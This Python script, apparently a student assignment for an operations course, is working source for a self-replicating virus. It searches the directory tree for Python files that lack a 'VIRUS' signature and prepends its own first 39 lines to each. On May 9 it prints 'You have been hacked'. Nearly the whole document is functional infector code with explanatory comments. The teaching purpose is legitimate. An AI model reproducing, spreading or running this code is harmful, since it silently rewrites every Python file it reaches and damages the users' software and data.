#!/usr/bin/env python3

# Script:                       Ops 301 Ops Chall #12
# Author:                       Brad Baack
# Date of latest revision:      04/9/2024
# Purpose:                      Malware 

import os
import datetime

SIGNATURE = "VIRUS"

# This function recursively searches for Python files that are not already infected.
def locate(path):
    files_targeted = []
    filelist = os.listdir(path)
    for fname in filelist:
        if os.path.isdir(path+"/"+fname):
            # If the item is a directory, it recurses into the directory to find more files.
            files_targeted.extend(locate(path+"/"+fname))
        elif fname[-3:] == ".py":
            # Checks if the file extension is '.py' for Python files.
            infected = False
            for line in open(path+"/"+fname):
                if SIGNATURE in line:
                    # Looks for the SIGNATURE in the file to determine if already infected.
                    infected = True
                    break
            if infected == False:
                # If the file is not infected, it adds it to the list of files to target.
                files_targeted.append(path+"/"+fname)
    return files_targeted

# This function is designed to prepend the virus code to the targeted files.
def infect(files_targeted):
    virus = open(os.path.abspath(__file__))
    virusstring = ""
    for i,line in enumerate(virus):
        if 0 <= i < 39:
            # Reads the first 39 lines of its own file - which is the virus code.
            virusstring += line
    virus.close  # Missing parentheses here, it should be virus.close()
    for fname in files_targeted:
        f = open(fname)
        temp = f.read()
        f.close()
        f = open(fname,"w")
        # Prepend the virus code to the original contents of the file.
        f.write(virusstring + temp)
        f.close()

# This function checks the current date and prints a message if it's May 9th.
def detonate():
    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9:
        print("You have been hacked")

# The main part of the script that gets executed:
# 1. It locates Python files to infect.
# 2. Infects them with the virus code.
# 3. Checks the date and potentially detonates the payload (prints a message).
files_targeted = locate(os.path.abspath(""))
infect(files_targeted)
detonate()